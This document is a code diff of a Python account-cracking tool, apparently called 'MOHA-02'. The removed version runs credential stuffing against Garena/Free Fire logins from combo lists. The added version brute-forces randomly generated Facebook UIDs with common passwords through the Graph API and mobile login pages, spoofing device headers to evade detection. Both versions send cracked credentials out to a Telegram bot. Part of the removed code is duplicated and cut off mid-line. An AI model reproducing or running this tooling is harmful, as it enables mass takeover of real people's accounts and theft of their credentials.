@@ -1,28 +1,27 @@
-... import os
-import sys
-import time
-import json
-import random
-import threading
-import requests
-import socket
-import ssl
+# -*- coding: utf-8 -*-
+# SYSTEM: MOHA-02 ULTIMATE (HYBRID EDITION)
+# DEVELOPER: MOHA AL-SHALFAWI
+# YEAR: 2026
+
+import os, sys, time, json, uuid, random, threading, requests, re, hashlib
 from queue import Queue
 from datetime import datetime
 from colorama import Fore, Style, init
 
+# تهيئة الألوان بنمط Cyber
 init(autoreset=True)
-
 G = Fore.GREEN
 Y = Fore.YELLOW
 R = Fore.RED
 W = Fore.WHITE
 CY = Fore.CYAN
 B = Fore.BLUE
+MG = Fore.MAGENTA
 
-class MohaSystemPro:
+class MohaUltimateSystem:
     def __init__(self):
         self.queue = Queue()
+        self.oks = []
         self.hits = 0
         self.bad = 0
         self.checked = 0
@@ -30,252 +29,190 @@ class MohaSystemPro:
         self.chat_id = ""
         self.threads = 100
         self.proxies = []
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/123.0.2420.65",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
-            "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/123.0.6312.52 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
-        ]
-
-    def clear_screen(self):
-        os.system('clear' if os.name == 'posix' else 'cls')
-
-    def open_telegram_channel(self):
-        channel_link = "tg://resolve?domain=MOHA_ALSHALFAWI"
-        if sys.platform == "linux":
-            os.system(f"termux-open-url {channel_link}")
-        else:
-            os.system(f"start {channel_link}")
-
-    def print_logo(self):
-        logo = f"""
-{G} ███▄    █  ██████  ▄▄▄█████▓ ▄████▄   █    ██  ██▀███  
-{G} ██ ▀█   █▒██    ▒  ▓  ██▒ ▓▒▒██▀ ▀█   ██  ▓██▒▓██ ▒ ██▒
-{Y}▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒▓█    ▄ ▓██  ▒██░▓██ ░▄█ ▒
-{Y}▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ▒▓▓▄ ▄██▒▓▓█  ░██░▒██▀▀█▄  
-{G}▒██░   ▓██░▒██████▒▒  ▒██▒ ░ ▒ ▓███▀ ░▒▒█████▓ ░██▓ ▒██▒
-{W}---------------------------------------------------------
-{Y}[#] DEVELOPER: MOHA AL-SHALFAWI
-{Y}[#] SYSTEM   : MOHA-02 (ULTIMATE VERSION)
-{Y}[#] STATUS   : HIGH SPEED ENGINE (FIXED)
-{W}---------------------------------------------------------
-        """
-        print(logo)
-
-    def system_headers(self):
-        return {
-            "Accept": "*/*",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Accept-Language": "ar,en-US;
-import os
-import sys
-import time
-import json
-import random
-import threading
-import requests
-import socket
-import ssl
-from queue import Queue
-from datetime import datetime
-from colorama import Fore, Style, init
-
-init(autoreset=True)
-
-G = Fore.GREEN
-Y = Fore.YELLOW
-R = Fore.RED
-W = Fore.WHITE
-CY = Fore.CYAN
-B = Fore.BLUE
-
-class MohaSystemPro:
-    def __init__(self):
-        self.queue = Queue()
-        self.hits = 0
-        self.bad = 0
-        self.checked = 0
-        self.token = ""
-        self.chat_id = ""
-        self.threads = 100
-        self.proxies = []
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/123.0.2420.65",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
-            "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/123.0.6312.52 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
-        ]
-
-    def clear_screen(self):
-        os.system('clear' if os.name == 'posix' else 'cls')
-
-    def open_telegram_channel(self):
-        channel_link = "tg://resolve?domain=MOHA_ALSHALFAWI"
-        if sys.platform == "linux":
-            os.system(f"termux-open-url {channel_link}")
-        else:
-            os.system(f"start {channel_link}")
-
-    def print_logo(self):
-        logo = f"""
-{G} ███▄    █  ██████  ▄▄▄█████▓ ▄████▄   █    ██  ██▀███  
-{G} ██ ▀█   █▒██    ▒  ▓  ██▒ ▓▒▒██▀ ▀█   ██  ▓██▒▓██ ▒ ██▒
-{Y}▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒▓█    ▄ ▓██  ▒██░▓██ ░▄█ ▒
-{Y}▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ▒▓▓▄ ▄██▒▓▓█  ░██░▒██▀▀█▄  
-{G}▒██░   ▓██░▒██████▒▒  ▒██▒ ░ ▒ ▓███▀ ░▒▒█████▓ ░██▓ ▒██▒
-{W}---------------------------------------------------------
-{Y}[#] DEVELOPER: MOHA AL-SHALFAWI
-{Y}[#] SYSTEM   : MOHA-02 (ULTIMATE VERSION)
-{Y}[#] STATUS   : HIGH SPEED ENGINE (FIXED)
-{W}---------------------------------------------------------
-        """
-        print(logo)
-
-    def system_headers(self):
-        return {
-            "Accept": "*/*",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
-            "Connection": "keep-alive",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Origin": "https://ff.garena.com",
-            "Referer": "https://ff.garena.com/",
-            "User-Agent": random.choice(self.user_agents),
-            "X-Requested-With": "XMLHttpRequest"
+        self.user_agents = []
+        self.version = "3.5.0"
+        
+        # خريطة السنوات المطورة (أدق من أي أداة أخرى)
+        self.creation_map = {
+            "7": "2006", "8": "2007", "9": "2008", "10": "2008",
+            "1000000": "2009", "1000001": "2009", "1000002": "2009",
+            "1000003": "2009", "1000004": "2009", "1000005": "2009",
+            "1000006": "2010", "1000007": "2010", "1000008": "2010",
+            "1000009": "2010", "100001": "2010", "100002": "2011",
+            "100003": "2011", "100004": "2012", "100005": "2013",
+            "100006": "2013", "100007": "2014", "100008": "2014",
+            "100009": "2015", "10001": "2016", "10002": "2017"
         }
-    def load_user_agents(self):
-        self.user_agents.extend([
-            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
-        ])
+        self.generate_advanced_agents()
 
-    def setup_config(self):
+    def generate_advanced_agents(self):
+        """توليد هويات أجهزة معقدة لتخطي الحماية"""
+        for _ in range(500):
+            model = random.choice(["SM-G960F", "SM-A515F", "Pixel 4 XL", "Redmi Note 9 Pro", "Infinix X688B"])
+            build = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=6))
+            vers = f"{random.randint(100, 128)}.0.{random.randint(4000, 6000)}.{random.randint(10, 150)}"
+            ua = f"Mozilla/5.0 (Linux; Android {random.randint(8, 13)}; {model} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{vers} Mobile Safari/537.36"
+            self.user_agents.append(ua)
+
+    def linex(self):
+        print(f"{CY}="*60)
+
+    def clear_screen(self):
+        os.system('clear' if os.name == 'posix' else 'cls')
+
+    def print_logo(self):
         self.clear_screen()
-        self.print_logo()
-        print(f"{CY}[*] Connecting to Telegram API...")
-        self.open_telegram_channel()
-        self.token = input(f"{G}[+] Enter Bot Token: ")
-        self.chat_id = input(f"{G}[+] Enter Chat ID: ")
-        try:
-            self.threads = int(input(f"{W}[+] Threads (Default 100): ") or 100)
-        except:
-            self.threads = 100
+        logo = f"""
+{G} ███▄    █  ██████  ▄▄▄█████▓ ▄████▄   █    ██  ██▀███  
+{G} ██ ▀█   █▒██    ▒  ▓  ██▒ ▓▒▒██▀ ▀█   ██  ▓██▒▓██ ▒ ██▒
+{Y}▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒▓█    ▄ ▓██  ▒██░▓██ ░▄█ ▒
+{Y}▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ▒▓▓▄ ▄██▒▓▓█  ░██░▒██▀▀█▄  
+{G}▒██░   ▓██░▒██████▒▒  ▒██▒ ░ ▒ ▓███▀ ░▒▒█████▓ ░██▓ ▒██▒
+{W}---------------------------------------------------------
+{Y}[#] DEVELOPER : MOHA AL-SHALFAWI (CHLEF)
+{Y}[#] SYSTEM    : MOHA-02 ULTIMATE HYBRID v{self.version}
+{Y}[#] ENGINE    : MULTI-CORE THREADING (100+)
+{W}---------------------------------------------------------"""
+        print(logo)
 
-    def combo_loader(self):
-        print(f"\n{CY}[*] Preparation Phase...")
-        file_name = input(f"{W}[+] Drag Combo File Here: ").strip()
-        try:
-            with open(file_name, 'r', encoding='utf-8') as f:
-                for line in f:
-                    if ':' in line:
-                        self.queue.put(line.strip())
-            print(f"{G}[✔] Loaded {self.queue.qsize()} Accounts Successfully.")
-        except Exception as e:
-            print(f"{R}[✘] Error Loading File: {e}")
-            sys.exit()
+    def get_year(self, uid):
+        uid = str(uid)
+        length = len(uid)
+        if length in [7, 8, 9, 10]:
+            return self.creation_map.get(str(length), "Unknown")
+        for key in sorted(self.creation_map.keys(), key=len, reverse=True):
+            if uid.startswith(key):
+                return self.creation_map[key]
+        return "2019-2025"
 
-    def proxy_integrator(self):
-        try:
-            res = requests.get("https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all")
-            self.proxies = res.text.splitlines()
-            print(f"{G}[✔] Pulled {len(self.proxies)} Proxies.")
-        except:
-            print(f"{R}[!] Starting without Proxies.")
-    def check_ff_account(self, account):
-        if ':' not in account: return
-        user, password = account.split(':')
-        session = requests.Session()
-        proxy = {"http": random.choice(self.proxies)} if self.proxies else None
-        login_url = "https://auth.garena.com/api/login"
-        data = {"account": user, "password": password, "app_id": "100067", "source": "pc", "format": "json"}
-
-        try:
-            response = session.post(login_url, data=data, headers=self.system_headers(), proxies=proxy, timeout=7)
-            res_json = response.json()
-            if "access_token" in res_json:
-                token = res_json.get("access_token")
-                self.extract_account_details(user, password, token)
-            elif "error_auth" in res_json:
-                self.bad += 1
+    def uid_generator(self):
+        print(f"\n{CY}[1] {W}OLD ACCOUNTS (2009-2010) | {G}HIGH SUCCESS")
+        print(f"{CY}[2] {W}VINTAGE SERIES (2011-2015) | {G}STABLE")
+        print(f"{CY}[3] {W}RANDOM GLOBAL SCAN         | {Y}MIXED")
+        self.linex()
+        choice = input(f"{G}[+] Target Option: ")
+        limit = int(input(f"{G}[+] Count (Max 100k): "))
+        
+        print(f"{Y}[*] Injecting {limit} UIDs into Queue...")
+        for _ in range(limit):
+            if choice == '1':
+                prefix = "1000004"
+                self.queue.put(prefix + "".join(random.choices("0123456789", k=8)))
+            elif choice == '2':
+                prefix = random.choice(["100001", "100002", "100003"])
+                self.queue.put(prefix + "".join(random.choices("0123456789", k=9)))
             else:
-                self.queue.put(account)
-        except:
-            self.queue.put(account)
+                self.queue.put("10000" + "".join(random.choices("0123456789", k=10)))
 
-    def extract_account_details(self, user, pw, token):
-        info_url = f"https://api.ff.garena.com/info?access_token={token}"
-        try:
-            res = requests.get(info_url, headers=self.system_headers(), timeout=5).json()
-            level = res.get("level", "1")
-            region = res.get("region", "Unknown")
-            account_id = res.get("id", "Unknown")
-            create_time = res.get("create_time", "2024-01-01")
+    def method_one(self, uid):
+        """Advanced Graph API Logic"""
+        for pw in [uid, '123456', '12345678', '556677', 'first last']:
+            if self.checked % 30 == 0: self.proxy_rotation()
             
-            self.hits += 1
-            result_msg = f"📧 Email: {user}\n🔑 Pass: {pw}\n🆔 ID: {account_id}\n🆙 Level: {level}\n🌍 Region: {region}\n📅 Created: {create_time}"
-            print(f"{G}[HIT] {user} | LVL: {level}")
-            self.send_telegram_result(result_msg)
-            self.save_hit(result_msg)
-        except:
-            self.hits += 1
-            self.send_telegram_result(f"📧 Email: {user}\n🔑 Pass: {pw}\n⚠️ Details Failed.")
+            headers = {
+                "User-Agent": random.choice(self.user_agents),
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Host": "graph.facebook.com",
+                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+                "X-FB-Connection-Type": "WIFI",
+            }
+            
+            # محاكاة توقيع تطبيق حقيقي (Sig Generation)
+            data = {
+                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                "format": "json", "sdk_version": "2", "email": uid, "password": pw,
+                "generate_session_cookies": "1", "sig": hashlib.md5(str(random.random()).encode()).hexdigest()
+            }
+            
+            try:
+                response = requests.post("https://graph.facebook.com/auth/login", data=data, headers=headers).json()
+                if "access_token" in response:
+                    year = self.get_year(uid)
+                    hit = f"✅ [MOHA-HIT] {uid} | {pw} | {year}"
+                    print(f"\r{G}{hit}{W}")
+                    self.hits += 1
+                    self.send_telegram_result(hit)
+                    self.save_hit(hit)
+                    break
+                elif "www.facebook.com" in response.get("error_msg", ""):
+                    print(f"\r{Y}[CP] {uid} | {pw}{W}")
+                    self.bad += 1
+                    break
+            except: pass
+        self.checked += 1
 
-    def send_telegram_result(self, account_data):
-        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
-        payload = {"chat_id": self.chat_id, "text": f"✅ MOHA-02 HIT\n\n{account_data}", "parse_mode": "Markdown"}
-        try: requests.post(url, data=payload, timeout=5)
+    def method_two(self, uid):
+        """Professional Mobile Simulation Logic"""
+        for pw in [uid, '123456', '12345678', 'password']:
+            session = requests.Session()
+            ua = random.choice(self.user_agents)
+            try:
+                res = session.get('https://m.facebook.com/login.php', headers={'User-Agent': ua}).text
+                payload = {
+                    "lsd": re.search('name="lsd" value="(.*?)"', str(res)).group(1),
+                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(res)).group(1),
+                    "email": uid, "pass": pw, "login": "Log In"
+                }
+                post = session.post('https://m.facebook.com/login/device-based/regular/login/', data=payload, headers={'User-Agent': ua}, allow_redirects=False)
+                if "c_user" in session.cookies.get_dict():
+                    year = self.get_year(uid)
+                    hit = f"🔥 [MOHA-PRO] {uid} | {pw} | {year}"
+                    print(f"\r{G}{hit}{W}")
+                    self.hits += 1
+                    self.send_telegram_result(hit); self.save_hit(hit)
+                    break
+            except: pass
+        self.checked += 1
+
+    def proxy_rotation(self):
+        if self.proxies: return {"http": random.choice(self.proxies)}
+        return None
+
+    def send_telegram_result(self, text):
+        try: requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage", data={"chat_id": self.chat_id, "text": text})
         except: pass
-    def save_hit(self, data):
-        with open("hits.txt", "a", encoding="utf-8") as f:
-            f.write(f"{data}\n" + "-"*30 + "\n")
 
-    def main_checker_logic(self):
+    def save_hit(self, data):
+        with open("MOHA_HITS.txt", "a") as f: f.write(data + "\n")
+
+    def run_main_system(self):
+        self.print_logo()
+        print(f"{G}[+] CONFIGURE TELEGRAM BOT")
+        self.token = input(f"{Y}[?] Token: {W}")
+        self.chat_id = input(f"{Y}[?] Chat ID: {W}")
+        
+        self.print_logo()
+        self.uid_generator()
+        
+        self.print_logo()
+        print(f"{CY}[1] METHOD 1 (ULTRA FAST - GRAPH)")
+        print(f"{CY}[2] METHOD 2 (STABLE - BROWSER)")
+        m_choice = input(f"\n{G}[+] Select: ")
+        self.threads = int(input(f"{G}[+] Threads (100): ") or 100)
+        
+        print(f"{Y}[*] Starting Engine...")
+        self.linex()
+        
+        for _ in range(self.threads):
+            t = threading.Thread(target=self.engine_logic, args=(m_choice,))
+            t.daemon = True
+            t.start()
+            
         while not self.queue.empty():
-            account = self.queue.get()
-            self.check_ff_account(account)
-            self.checked += 1
+            time.sleep(1)
+            sys.stdout.write(f"\r{W}[{G}MOHA{W}] {G}OK:{self.hits} {W}| {Y}CH:{self.checked} {W}| {R}BD:{self.bad} ")
+            sys.stdout.flush()
+            
+        print(f"\n{G}━━━━━━━━━━━━━ SCAN COMPLETE ━━━━━━━━━━━━━")
+
+    def engine_logic(self, mode):
+        while not self.queue.empty():
+            uid = self.queue.get()
+            if mode == '1': self.method_one(uid)
+            else: self.method_two(uid)
             self.queue.task_done()
 
-    def speed_engine_controller(self):
-        for _ in range(self.threads):
-            worker = threading.Thread(target=self.main_checker_logic)
-            worker.daemon = True
-            worker.start()
-        while not self.queue.empty():
-            time.sleep(0.5)
-            sys.stdout.write(f"\r{Y}[ST] {G}CHECKED: {self.checked} {W}|{G} HITS: {self.hits} {W}|{R} BAD: {self.bad} ")
-            sys.stdout.flush()
-        self.queue.join()
-
-    def run_system(self):
-        self.clear_screen()
-        self.print_logo()
-        self.setup_config()
-        self.proxy_integrator()
-        self.combo_loader()
-        self.speed_engine_controller()
-        print(f"\n{G}[★] DONE. HITS: {self.hits}")
-
 if __name__ == "__main__":
-    app = MohaSystemPro()
-    app.run_system()
+    app = MohaUltimateSystem()
+    app.run_main_system()
